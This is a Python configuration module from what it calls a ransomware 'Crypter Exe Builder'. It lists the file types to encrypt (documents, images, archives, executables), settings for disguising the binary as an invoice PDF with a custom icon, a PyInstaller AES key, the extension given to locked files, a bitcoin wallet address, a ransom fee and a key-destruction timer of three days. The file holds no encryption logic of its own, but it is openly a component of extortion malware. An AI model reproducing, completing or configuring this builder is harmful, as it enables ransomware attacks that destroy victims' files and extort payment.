# -*- coding: utf-8 -*-
'''
@summary: Crypter Exe Builder: Base schema and config
@author: MLS
'''

# Import libs
import re

## DEFAULT FILETYPES TO ENCRYPT
# The default list of filetypes which can be encrypted
ENCRYPTABLE_FILETYPES = [
    # GENERAL FORMATS
    "sln",

    # IMAGE FORMATS
    "jpg", "png",

    # VIDEO FORMATS
    "mp4", "avi", "mkv",
    
    # DOCUMENT FORMATS
    "doc", "docx", "txt", "pdf",

    # SOUND FORMATS
    "mp3",

    # EXE FORMATS
    "exe", "msi", "php",

    # COMPRESSION FORMATS
    "tgz", "zip", "rar"
    ]


## CONFIGURATION
'''
@summary: The configuration dictionary containing the configuration options for the ransomware
@note: To add a new field, adjust the GUI form appropriately and add the settings for the new
field to this dictionary
'''
CONFIG_ITEMS = {
    "builder_langauge": {
        "label": "Builder Language",
        "label_object_name": "BuilderLanguageLabel",
        "input_object_name": "BuilderLanguageChoice",
        "regex": re.compile("^.*$"),
        "example": "English or Русский",
        "config_area": "Language",
        "default": "English"
        },
    "debug_level": {
        "label": "Debug verbosity level",
        "label_object_name": "DebugLevelLabel",
        "input_object_name": "DebugLevelChoice",
        "regex": re.compile("^.*$"),
        "example": "0 - Minimal",
        "config_area": "Debug",
        "default": "English"
        },
    "maj_version": {
        "label": "Major Version",
        "label_object_name": "MajorVersionLabel",
        "input_object_name": "MajorVersionTextCtrl",
        "regex": re.compile("^.+$"),
        "example": "5",
        "config_area": "Version Information"
        },
    "min_version": {
        "label": "Minor Version",
        "regex": re.compile("^.*$"),
        "label_object_name": "MinorVersionLabel",
        "input_object_name": "MinorVersionTextCtrl",
        "example": "20",
        "config_area": "Version Information"
        },
    "filename": {
        "label": "Filename",
        "label_object_name": "FilenameLabel",
        "input_object_name": "FilenameTextCtrl",
        "regex": re.compile("^.*$"),
        "example": "invoice_pdf",
        "config_area": "Binary Settings"
        },
    "extension": {
        "label": "Extension",
        "label_object_name": "ExtensionLabel",
        "input_object_name": "ExtensionTextCtrl",
        "regex": re.compile("^.*$"),
        "example": "pdf",
        "config_area": "Binary Settings"
        },
    "pyinstaller_aes_key": {
        "label": "PyInstaller AES Key",
        "label_object_name": "PyinstallerAesKeyLabel",
        "input_object_name": "PyinstallerAesKeyTextCtrl",
        "regex": re.compile("^.*$"),
        "example": "093AC769F6557577452E9DB2C74B984A",
        "config_area": "Binary Settings"
        },
    "icon_file": {
        "label": "Icon",
        "label_object_name": "IconLabel",
        "input_object_name": "IconFilePicker",
        "regex": re.compile("^.*$"),
        "example": "icon.ico",
        "config_area": "Binary Settings"
        },
    "encrypted_file_extension": {
        "label": "Encrypted File Extension",
        "label_object_name": "EncryptedFileExtensionLabel",
        "input_object_name": "EncryptedFileExtensionTextCtrl",
        "regex": re.compile("^.*$"),
        "example": "locked",
        "config_area": "Ransomware Settings",
        "default": "locked"
        },
    "wallet_address": {
        "label": "Wallet Address",
        "label_object_name": "WalletAddressLabel",
        "input_object_name": "WalletAddressTextCtrl",
        "regex": re.compile("^.*$"),
        "example": "12mdKVNfAhLbRDLtRWQFhQgydgU6bUMjay",
        "config_area": "Ransomware Settings",
        "default": "12mdKVNfAhLbRDLtRWQFhQgydgU6bUMjay"
        },
    "bitcoin_fee": {
        "label": "Bitcoin Fee",
        "label_object_name": "BitcoinFeeLabel",
        "input_object_name": "BitcoinFeeTextCtrl",
        "regex": re.compile("^.*$"),
        "example": "0.0897",
        "config_area": "Ransomware Settings",
        "default": "1.0"
        },
    "key_destruction_time": {
        "label": "Key Destruction Time(s)",
        "label_object_name": "KeyDestructionTimeLabel",
        "input_object_name": "KeyDestructionTimeTextCtrl",
        "regex": re.compile("^.*$"),
        "example": "259200",
        "config_area": "Ransomware Settings",
        "default": "259200"
        },
    "max_file_size_to_encrypt": {
        "label": "Max File Size to Encrypt",
        "label_object_name": "MaxFileSizeLabel",
        "input_object_name": "MaxFileSizeTextCtrl",
        "regex": re.compile("^.*$"),
        "example": "512",
        "config_area": "Ransomware Settings",
        "default": "512"
        },
    "filetypes_to_encrypt": {
        "label": "Filetypes to Encrypt",
        "label_object_name": "FiletypesToEncryptLabel",
        "input_object_name": "FiletypesToEncryptTextCtrl",
        "regex": re.compile("^.*$"),
        "example": "pdf,exe,msi,doc",
        "config_area": "Ransomware Settings",
        "default": ENCRYPTABLE_FILETYPES
        }
    }

CONFIG_FILE_NAME = "BuildConfig.new"

## LANGUAGE
SUPPORTED_LANGUAGES = [
    u"English"
    #u"Русский"
    ]

DEFAULT_LANGUAGE = "English"

# English Form text
english_language_form_labels = {
    "language_settings_sizer": "Language"
    }

# ERRORS
ERROR_INVALID_DATA = 13
